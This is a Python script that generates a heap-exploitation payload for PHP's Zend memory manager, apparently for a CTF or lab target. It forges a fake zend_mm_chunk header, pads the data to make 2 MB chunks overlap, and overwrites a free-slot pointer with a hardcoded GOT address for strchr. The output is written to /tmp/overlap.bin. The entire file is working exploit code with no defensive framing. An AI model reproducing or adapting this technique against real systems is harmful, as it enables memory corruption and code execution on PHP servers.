import struct

'''
struct _zend_mm_chunk {
	zend_mm_heap      *heap;
	zend_mm_chunk     *next;
	zend_mm_chunk     *prev;
	uint32_t           free_pages;				/* number of free pages */
	uint32_t           free_tail;               /* number of free pages at the end of chunk */
	uint32_t           num;
	char               reserve[64 - (sizeof(void*) * 3 + sizeof(uint32_t) * 3)];
	zend_mm_heap       heap_slot;               /* used only in main chunk */
	zend_mm_page_map   free_map;                /* 512 bits or 64 bytes */
	zend_mm_page_info  map[ZEND_MM_PAGES];      /* 2 KB = 512 * 4 */
};
'''

num = 1
offset = 0x1000 + 0x700 * num
strchr_got = 0x7f6eb65dd260 - 24

#2mb chunk -- overlap $arr[6] in script
p1 = 'A' * ( 2 * 1024 * 1024 - 0x18 )

#2mb chunk -- overlap chunk 2 with bin 26 page

#create fake zend_mm_chunk struct
s = ''
s += struct.pack('<Q', 0x42424242)   		#heap
s += struct.pack('<Q', 0x4546)				#next
s += struct.pack('<Q', 0x4748)				#prev
s += struct.pack('<I', 0)					#free_pages
s += struct.pack('<I', 0)					#free_tail
s += struct.pack('<I', 0)					#num
s += 'X' * 28
s += 'Y' * 0x188
s += chr(0xff) * 0x40
s += struct.pack('<I', 0) * 512

p2 = s + 'A' * (offset - len(s)) + struct.pack('<Q', strchr_got)   #set next_free_slot

p3 = p1 + p2 + 'B' * (2 * 1024 * 1024 - 0x2000 - 0x800 - offset)

print(hex(len(p3)))

open('/tmp/overlap.bin','wb').write(p3)